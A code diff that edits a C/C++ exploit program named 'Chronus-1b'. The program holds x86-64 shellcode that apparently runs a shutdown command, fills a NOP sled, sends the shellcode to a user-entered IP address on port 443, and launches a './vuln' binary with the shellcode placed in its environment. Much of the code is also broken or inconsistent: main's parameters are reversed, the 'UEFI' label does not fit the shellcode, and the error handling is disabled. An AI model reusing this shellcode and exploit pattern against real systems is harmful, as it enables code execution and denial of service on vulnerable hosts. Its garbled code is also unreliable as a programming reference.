@@ -1,6 +1,5 @@
 #include <unistd.h>
 #include <sys/socket.h>
-#include <iostream>
 #include <netinet/in.h>
 #include <stdio.h>
 #include <arpa/inet.h>
@@ -9,15 +8,14 @@
 #include <cstdlib>
 
 #include "resource/iphdr"
-
 /*Define a Small buffer*/
 #define VULN "./vuln`"
 /* UEFI Boot Shellcode. */
 
-#define PORT 4444
+#define PORT 443
 #define SIZE 160
 
-char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
+ char  sc[]=  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x77\x66\x68\x6e\x6f\x48\x89\xe3"
 "\x50\x66\x68\x2d\x68\x48\x89\xe1"
 "\x50\x49\xb8\x2f\x73\x62\x69\x6e"
@@ -34,9 +32,14 @@ int main(char * argv[], int  argc)
     // our socket
     int ipv4 = socket(AF_INET, SOCK_STREAM, 0);
     
+    if (ipv4 < 0) 
+    {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
     // ENVP / Environment Variable Call : char * env  = {sc, NULL};
-    char * env = {sc, NULL};
-    char * vuln[] = {VULN, p, NULL };
+    char  *env[] = {sc, NULL};
+    char  *vuln[] = {VULN, p, NULL };
 
     char nop_sled[SIZE];
     memset(nop_sled, 0x90, SIZE); // Fill the buffer with NOP instructions
@@ -60,7 +63,6 @@ int main(char * argv[], int  argc)
 
     char buffer[8] = {IPPROTO_TCP};
 
-    std::ios::sync_with_stdio(true);
 
     printf(" Chronus-1b \n");
 
@@ -68,16 +70,15 @@ int main(char * argv[], int  argc)
 
     printf(" Enter in Linux Build: \n");
 
-    std::cin >> address;
+    scanf("%255s", address);
+    struct in_addr res; // resolve
 
     printf("Getting host. \n");
 
-    host = gethostbyname(address);
-
-    if (host == NULL) 
+    if (inet_aton(address, &res) == 0 )
     {
-        perror("gethostbyname");
-        exit(-1);
+        fprintf(stderr, "IP Invalid %s \n", address);
+        exit(EXIT_FAILURE);
     }
     else 
     {
@@ -89,19 +90,20 @@ int main(char * argv[], int  argc)
     storage.sin_addr.s_addr = INADDR_ANY;
     storage.sin_family = AF_INET;
     storage.sin_port = htons(PORT); // Port 0 is for dynamic port.
-
+    printf("Storage resolved. \n");
     sockaddr_in remote;
-    remote.sin_addr =*(struct in_addr *)host->h_addr_list[0].
+    remote.sin_addr.s_addr = inet_addr(address);
     remote.sin_family = AF_INET;
     remote.sin_port = htons(PORT);
-
-    set = bind(ipv4, (struct sockaddr*)&storage, sizeof(storage) );
-
-    if (set < 0) 
+    printf("Binding \n");
+    /*
+    if (bind(ipv4, ( sockaddr*)&storage, sizeof(storage) ) < 0) 
     {
         perror("bind");
-        exit(-1);
-    }
+        exit(EXIT_FAILURE);
+    }*/
+
+
 
     // After initial connection has been made, declare IP Header.
     header = (struct iphdr *)malloc(sizeof(struct iphdr));
@@ -112,22 +114,24 @@ int main(char * argv[], int  argc)
     header->protocol = IPPROTO_TCP;
 
     token.HtonData(header, buffer);
-
+    printf("Token Data Registered. \n");
 
     // Connect to remote host
     if (connect(ipv4, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
         perror("connect");
-        exit(EXIT_FAILURE);
+
     }
+    printf("Connection, complete.");
 
     // Send the shellcode
-    if (send(ipv4, code, sizeof(code), 0) < 0) {
+    if (send(ipv4, sc, sizeof(sc), 0) < 0) {
         perror("send");
         exit(EXIT_FAILURE);
     }
-
+    printf("Complete. \n");
     // Close the socket
-    execle(vuln[0], char(*)vuln, p, NULL, env);
+    execle(vuln[0], (char*)vuln, p, NULL, env);
+    printf("Executed vulnerability.");
     close(ipv4);
     free(header);
     return 0;
